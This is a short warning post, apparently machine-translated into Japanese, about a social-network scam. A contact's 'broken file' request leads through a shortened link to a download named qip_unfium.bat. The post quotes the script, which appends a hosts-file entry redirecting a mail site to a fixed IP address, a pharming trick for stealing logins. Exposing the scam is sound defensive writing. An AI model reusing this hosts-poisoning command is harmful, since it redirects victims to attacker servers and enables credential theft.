ソーシャルファーミング ネットワーク

ソーシャルネットワークを通じて別の農業の流行が始まったようです。



よく知られている人気のあるソーシャルネットワークの1つ（または1つに含まれていない場合もあります）では、次の形式のメッセージ：

1つのファイルが機能しません。自分で確認できますか？


もちろん、人は答えを受け取ります：

できます、こんにちは）


そしてしばらくすると、次のメッセージを受け取ります。

urlshort.me **エラーなしのファイルの実行？））


（アドレスはアスタリスクで閉じられているため、クリックすると便利です:)



人生経験（自分自身を含む）で教えられた人として、彼はシークレットモードでブラウザのリンクをたどりました。 短縮されたリンクは、人気のあるファイルホスティングサービスの1つにつながり、そこからqip_unfium.bat



ファイルをダウンロードすることを提案します。

@rem ----- ExeScript Options Begin -----

@rem ScriptType: console

@rem DestDirectory: temp

@rem Icon: default

@rem ----- ExeScript Options End -----

@echo off

echo 81.94.229.115 www.mail.i.ua >> %windir%\system32\drivers\etc\hosts
